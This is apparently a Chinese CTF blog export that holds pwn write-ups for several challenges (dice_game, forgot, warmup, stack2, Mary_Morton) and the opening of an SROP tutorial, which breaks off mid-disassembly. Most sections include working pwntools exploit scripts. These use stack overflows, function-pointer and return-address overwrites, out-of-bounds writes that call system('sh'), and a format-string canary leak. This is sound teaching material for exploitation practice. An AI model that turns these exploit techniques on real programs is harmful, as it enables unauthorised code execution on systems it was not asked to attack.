    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/99999.jpg" alt></p><a id="more"></a><h1 id="0x01-dice-game"><a href="#0x01-dice-game" class="headerlink" title="0x01 dice_game"></a>0x01 dice_game</h1><ul><li>题目来源:XCTF 4th-QCTF-2018</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><ul><li>题目逻辑较为简单,题目提供了libc.so.6。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191124165232.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191124165241.png" alt></p><ul><li><p>所以可以直接覆盖掉seed,然后利用ctypes库模拟生成随机数即可。</p></li><li><p>exp如下:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#c = process('./dice_game')</span></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">58797</span>)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x40</span></span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> c.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    c.recvuntil(<span class="string">'Give me the point(1~6): '</span>)</span><br><span class="line">    c.sendline(str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x02-forgot"><a href="#0x02-forgot" class="headerlink" title="0x02 forgot"></a>0x02 forgot</h1><ul><li>题目来源: backdoorctf-2015</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure><ul><li>先看一下主函数,注意这一块。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191124170201.png" alt></p><ul><li>v2是个32大小的数组,且用是<code>scanf(&quot;%s&quot;,v2)</code>来进行输入,没有控制输入长度。之后的v3、v4…..v12都为函数指针。这道题就考察通过将目标(get shell)地址覆盖到这几个函数指针中的任意一个来实现调用。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191124170651.png" alt></p><ul><li><p>题目是一个和检查email格式有关的程序。首先会问你name,这个随便填即可,因为用了fgets且大小合理,不会造成溢出。</p></li><li><p>然后程序会通过<code>sub_80485DD函数</code>欢迎你,告诉你要输入个email。</p></li><li><p>v3到v12都是会puts一段话语,其中v9、v10、v11的内容一样, 因此我们可以选择故意触发v3~v8或者v12其中任意一个函数。(不选v9、v10、v11是因为它们puts的内容一样,不太容易知道到底调用了哪一个,当然也可以选用这些,调试一下也能知道调用的是哪一个。)</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191124171035.png" alt></p><ul><li>我们运行一下程序,发现触发了v4所对应的<code>sub_8048618</code>函数。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191124171227.png" alt></p><ul><li>又发现了<code>cat flag</code>函数,地址为0x80486cc。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191124171334.png" alt></p><ul><li><p>因此覆盖思路为, 先覆盖掉32大小的v2数组,然后用4字节覆盖掉v3指针,然后用目标函数地址覆盖掉v4指针,这样来故意触发<code>cat flag</code>。</p></li><li><p>exp如下:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">40030</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'.'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'.'</span>*(<span class="number">32</span>+<span class="number">4</span>) + p32(<span class="number">0x80486cc</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x03-warmup"><a href="#0x03-warmup" class="headerlink" title="0x03 warmup"></a>0x03 warmup</h1><ul><li>攻防世界上面没给题目附件…</li><li>根据题目来源: csaw-ctf-2016-quals,搜了一下这道题,不难,直接上exp吧:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'192.168.229.128'</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'WOW:'</span>)</span><br><span class="line"></span><br><span class="line">address = r.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">72</span> + p64(int(address, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">r.writeline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x04-stack2"><a href="#0x04-stack2" class="headerlink" title="0x04 stack2"></a>0x04 stack2</h1><ul><li>题目来源: XCTF 4th-QCTF-2018</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure><ul><li>程序是一个简易计算器。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191124171929.png" alt><br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191124171939.png" alt></p><ul><li>漏洞点在<code>3. change number</code>。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191124172017.png" alt></p><ul><li>没有对边界进行检测,可以产生越界操作。</li></ul><h2 id="首次尝试"><a href="#首次尝试" class="headerlink" title="首次尝试"></a>首次尝试</h2><ul><li>思路是通过越界操作将ret_addr改成目标(get shell)地址。</li><li>发现程序存在后面函数<code>hackhere</code>,地址为<code>0x0804859B</code>。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191124172231.png" alt></p><ul><li><p>首先我们需要知道v13这个数组距离ret_addr的偏移。</p></li><li><p>v13是EBP-0x70,但是EIP却不是EBP+4,至于为什么, 有博主说这是因为开了Canary保护,需要动态调试计算这个偏移,下面来动态调试计算这个偏移。</p></li></ul><h3 id="偏移计算"><a href="#偏移计算" class="headerlink" title="偏移计算"></a>偏移计算</h3><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191124184238.png" alt></p><ul><li>用gdb来调试这个程序,我们将断点下在<code>0x080488EE</code>的位置,即<code>main函数的leave</code>的位置。</li><li>因为此时栈帧还没还原,这时候我们能读取到<code>ebp</code>(ebp在一个栈帧中是不变的,直到销毁栈帧。所以我们此刻的ebp就是main函数最开始的ebp。),并且再单步几次就能到达<code>retn指令</code>,<code>retn</code>相当于<code>pop eip</code>,此刻栈顶存着的便是<code>ret_addr</code>的位置。</li></ul><ul><li>运行以后随便个数,然后输入5来执行程序的exit,就可以来到断点位置。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191124184944.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191124185045.png" alt></p><ul><li>这时候看到EBP为<code>0xffffcee8</code>,这个值以及下面会出现的<code>ret_addr</code>的值不同环境可能不一样,但是偏移是一样的。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191124185151.png" alt></p><ul><li><p>继续单步, 来到<code>ret</code>的位置,我们看到ESP为<code>0xffffcefc</code>,这便是<code>ret_addr</code>的位置。</p></li><li><p>由于<code>v13 = EBP - 0x70</code>,<code>ret_addr - EBP = 0x14</code>,所以<code>偏移offset = ret_addr - v13 = 0x84</code>。</p></li></ul><h3 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h3><ul><li><p>函数式编程确实挺香,至少对于这次exp里面的write函数是这样,start函数和exit倒无所谓。</p></li><li><p>test.py如下,注意是test,因为这个exp并不正确。</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#c = process('./stack2')</span></span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">55145</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x84</span></span><br><span class="line"></span><br><span class="line">hackhere_addr = <span class="number">0x0804859B</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'How many numbers you have:\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'1'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Give me your numbers\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr,value)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'5. exit\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'3'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'which number to change:\n'</span>)</span><br><span class="line">    c.sendline(str(addr))</span><br><span class="line">    c.recvuntil(<span class="string">'new number:\n'</span>)</span><br><span class="line">    c.sendline(str(value))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'5. exit\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'5'</span>)</span><br><span class="line">    c.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start()</span><br><span class="line">write(offset,<span class="number">0x9B</span>)</span><br><span class="line">write(offset+<span class="number">1</span>,<span class="number">0x85</span>)</span><br><span class="line">write(offset+<span class="number">2</span>,<span class="number">0x04</span>)</span><br><span class="line">write(offset+<span class="number">3</span>,<span class="number">0x08</span>)</span><br><span class="line">exit()</span><br></pre></td></tr></table></figure><ul><li>至于为什么不正确,原因如下。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191124190500.png" alt></p><h2 id="第二次尝试"><a href="#第二次尝试" class="headerlink" title="第二次尝试"></a>第二次尝试</h2><ul><li><p>第一种思路由于环境问题未打通, 这次换种思路,直接调用system函数,给它传入参数<code>sh</code>。</p></li><li><p>我们在程序中找到了<code>sh</code>。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191124191002.png" alt></p><ul><li><p>可以得到sh的地址为<code>0x08048987</code>。</p></li><li><p>exp如下:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./stack2'</span>)</span><br><span class="line">gdb.attach(c,<span class="string">'b * 0x080488F2'</span>)</span><br><span class="line"><span class="comment">#c = remote('111.198.29.45',55145)</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x84</span></span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x08048450</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'How many numbers you have:\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'1'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Give me your numbers\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr,value)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'5. exit\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'3'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'which number to change:\n'</span>)</span><br><span class="line">    c.sendline(str(addr))</span><br><span class="line">    c.recvuntil(<span class="string">'new number:\n'</span>)</span><br><span class="line">    c.sendline(str(value))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'5. exit\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'5'</span>)</span><br><span class="line">    c.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start()</span><br><span class="line"></span><br><span class="line">write(offset,<span class="number">0x50</span>)</span><br><span class="line">write(offset+<span class="number">1</span>,<span class="number">0x84</span>)</span><br><span class="line">write(offset+<span class="number">2</span>,<span class="number">0x04</span>)</span><br><span class="line">write(offset+<span class="number">3</span>,<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">offset += <span class="number">8</span> <span class="comment">#!!!!Look here~  </span></span><br><span class="line"></span><br><span class="line">write(offset,<span class="number">0x87</span>)</span><br><span class="line">write(offset+<span class="number">1</span>,<span class="number">0x89</span>)</span><br><span class="line">write(offset+<span class="number">2</span>,<span class="number">0x04</span>)</span><br><span class="line">write(offset+<span class="number">3</span>,<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">exit()</span><br></pre></td></tr></table></figure><ul><li>注意offset+8,通过调试也能发现是需要+8,如果不调试而从理论上解释的话,就涉及到参数传递的知识了。这里直接引用某博主的一句解释:</li></ul><blockquote><p>调用system后esp指向offset+4的地方，此时esp指向的应该是返回地址，esp+4即offset+8的地方才是system的参数。</p></blockquote><h1 id="0x05-pwn100"><a href="#0x05-pwn100" class="headerlink" title="0x05 pwn100"></a>0x05 pwn100</h1><p><a href="http://liul14n.top/2019/12/02/LCTF-2016-pwn100/">传送门</a></p><h1 id="0x06-Mary-Morton"><a href="#0x06-Mary-Morton" class="headerlink" title="0x06 Mary_Morton"></a>0x06 Mary_Morton</h1><ul><li>题目来源: ASIS-CTF-Finals-2017</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_4009FF();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to the battle ! "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[Great Fairy] level pwned "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Select your weapon "</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4009DA();</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      fmt();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Bye "</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">      stackoverflow();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Wrong!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_4008EB</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x7F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_400960</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"-&gt; %s\n"</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00000000004008</span>DA</span><br><span class="line">.text:<span class="number">00000000004008</span>DA</span><br><span class="line">.text:<span class="number">00000000004008</span>DA ; Attributes: bp-based frame</span><br><span class="line">.text:<span class="number">00000000004008</span>DA</span><br><span class="line">.text:<span class="number">00000000004008</span>DA backdoor proc near</span><br><span class="line">.text:<span class="number">00000000004008</span>DA ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000004008</span>DA push    rbp</span><br><span class="line">.text:<span class="number">00000000004008</span>DB mov     rbp, rsp</span><br><span class="line">.text:<span class="number">00000000004008</span>DE mov     edi, offset command ; <span class="string">"/bin/cat ./flag"</span></span><br><span class="line">.text:<span class="number">00000000004008E3</span> call    _system</span><br><span class="line">.text:<span class="number">00000000004008E8</span> nop</span><br><span class="line">.text:<span class="number">00000000004008E9</span> pop     rbp</span><br><span class="line">.text:<span class="number">00000000004008</span>EA retn</span><br><span class="line">.text:<span class="number">00000000004008</span>EA ; &#125; <span class="comment">// starts at 4008DA</span></span><br><span class="line">.text:<span class="number">00000000004008</span>EA backdoor endp</span><br><span class="line">.text:<span class="number">0000000000</span></span><br></pre></td></tr></table></figure><ul><li>一道简单的pwn题, 考察通过格式化字符串漏洞泄露canary,然后再进行栈溢出ret。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191210201707.png" alt></p><ul><li><p>首先通过手动测出来偏移为6。</p></li><li><p>由于我们的<code>canary</code>距离<code>buf</code>有0x90 - 0x8 = 0x88个字节,而程序是64位的,所以每八个字节一组, 0x88字节即为17组。 所以我们canary距离我们输入的偏移为<code>6 + 17 = 23</code>。</p></li><li><p>所以就可以直接通过格式化字符串泄露canary了,然后就是基础的rop了。</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'111.198.29.45'</span>,<span class="number">44367</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x4008DA</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'3. Exit the battle'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'%23$p'</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line"></span><br><span class="line">canary = c.recv(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'canary = '</span> + canary)</span><br><span class="line"></span><br><span class="line">canary = int(canary,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'3. Exit the battle'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x90</span><span class="number">-0x8</span>) + p64(canary) + <span class="string">'a'</span>*<span class="number">8</span> + p64(target)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x007-未完待续"><a href="#0x007-未完待续" class="headerlink" title="0x007 未完待续"></a>0x007 未完待续</h1>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>通过三道题目学习SROP技术</title>
    <url>/2020/03/11/%E9%80%9A%E8%BF%87%E4%B8%89%E9%81%93%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0SROP%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/32387154_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>很久之前就听大佬说过SROP了，前几天也通过SROP技术做出来一道题目，不过是看的别人WP之后才会的。</p><p>今天具体学习了一下SROP技术，先贴几个参考链接:</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#_12" target="_blank" rel="noopener">CTF-WIKI</a></p><p><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">FreeBuf</a></p><blockquote><p>需要注意的是，pwntools中的SigreturnFrame中并不需要填写rt_sigreturn的地址，我们只需要确保执行rt_sigreturn的时候栈顶是SigreturnFrame就行。</p></blockquote><p>形如：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov rax,<span class="number">15</span>;</span><br><span class="line">syscall;</span><br></pre></td></tr></table></figure><p>这种可以直接send(str(frame))</p><p>但形如</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">syscall(<span class="number">15L</span>L, &amp;buf);</span><br></pre></td></tr></table></figure><p>这种需要send(str(frame)[8:])</p><p>前八个是调用rt_sigreturn函数的 ?</p><p>本文通过三道题目来练习这项技术，题目按照顺序来的<del>层层递进</del></p><h1 id="0x01-Ciscn-2019-s-3"><a href="#0x01-Ciscn-2019-s-3" class="headerlink" title="0x01 Ciscn_2019_s_3"></a>0x01 Ciscn_2019_s_3</h1><p>这道题目也就是我刚刚说过的通过别人的WP第一次了解SROP并用这技术做出来的题目。</p><p><strong>这道题目的特点在于</strong></p><ol><li>题目已经给了<code>mov rax,59(对应execve系统调用)</code>、<code>mov rax,15(对应sigreturn系统调用)</code></li><li>SROP能够利用到的gadgets是<code>syscall; ret</code></li></ol><p>因为之前我已经专门更过这道题的博客了，所以这里直接放链接</p><p><a href="http://liul14n.top/2020/03/07/Ciscn-2019-s-3/">传送门</a></p><h1 id="0x02-smallest-pwn"><a href="#0x02-smallest-pwn" class="headerlink" title="0x02 smallest pwn"></a>0x02 smallest pwn</h1><p>这是CTF-WIKI上面给的一道例题。</p><p><strong>这道题目的特点是</strong></p><ol><li>程序非常小，由汇编语言写成</li><li>相比上一道题目，没有给出<code>mov rax,59</code>或者<code>mov rax,15</code></li><li>需要通过程序的read系统调用的读入字节数来设置rax的值。</li><li>SROP能够利用的gadgets是<code>syscall;ret</code></li></ol><p>这道题目有一个博主已经讲解的非常详细了，而且最后这位博主画的流程图很直观，我再写也只能是模仿，很难再超越了。这里直接给出链接了</p><p><a href="https://www.jianshu.com/p/b838a10b63c7" target="_blank" rel="noopener">简书</a></p><h1 id="0x03-rootersctf-2019-srop"><a href="#0x03-rootersctf-2019-srop" class="headerlink" title="0x03 rootersctf_2019_srop"></a>0x03 rootersctf_2019_srop</h1><p>这是BUUCTF上的一道题目</p><p><strong>这道题的特点是</strong></p><ol><li>程序非常小，由汇编语言写成</li><li>依然没有<code>mov rax,59</code>或者<code>mov rax,15</code></li><li>存在<code>pop rax</code></li><li>能够利用的gadgets是<code>pop rax;syscall;leave;ret</code>和<code>syscall;leave;ret</code>（可以注意到相比前两道题目，syscall和ret之间多了一个leave</li></ol><h2 id="0x001-分析"><a href="#0x001-分析" class="headerlink" title="0x001 分析"></a>0x001 分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure><p>程序只开了NX保护</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000401000 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000401000</span><br><span class="line">.text:0000000000401000 ; Attributes: bp-based frame</span><br><span class="line">.text:0000000000401000</span><br><span class="line">.text:0000000000401000 sub_401000      proc near               ; CODE XREF: start↓p</span><br><span class="line">.text:0000000000401000                                         ; DATA XREF: LOAD:0000000000400088↑o</span><br><span class="line">.text:0000000000401000</span><br><span class="line">.text:0000000000401000 buf             = byte ptr -80h</span><br><span class="line">.text:0000000000401000</span><br><span class="line">.text:0000000000401000                 push    rbp</span><br><span class="line">.text:0000000000401001                 mov     rbp, rsp</span><br><span class="line">.text:0000000000401004                 sub     rsp, 40h</span><br><span class="line">.text:0000000000401008                 mov     eax, 1</span><br><span class="line">.text:000000000040100D                 mov     edi, 1          ; fd</span><br><span class="line">.text:0000000000401012                 lea     rsi, buf        ; &quot;Hey, can i get some feedback for the CT&quot;...</span><br><span class="line">.text:000000000040101A                 mov     edx, 2Ah        ; count</span><br><span class="line">.text:000000000040101F                 syscall                 ; LINUX - sys_write</span><br><span class="line">.text:0000000000401021                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000401026                 lea     rsi, [rsp+40h+buf] ; buf</span><br><span class="line">.text:000000000040102B                 mov     edx, 400h       ; count</span><br><span class="line">.text:0000000000401030                 push    0</span><br><span class="line">.text:0000000000401032                 pop     rax</span><br><span class="line">.text:0000000000401033                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:0000000000401035                 leave</span><br><span class="line">.text:0000000000401036                 retn</span><br><span class="line">.text:0000000000401036 sub_401000      endp</span><br><span class="line">.text:0000000000401036</span><br><span class="line">.text:0000000000401037</span><br><span class="line">.text:0000000000401037 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000401037</span><br><span class="line">.text:0000000000401037 ; Attributes: noreturn</span><br><span class="line">.text:0000000000401037</span><br><span class="line">.text:0000000000401037                 public start</span><br><span class="line">.text:0000000000401037 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000401037                 call    sub_401000</span><br><span class="line">.text:000000000040103C                 mov     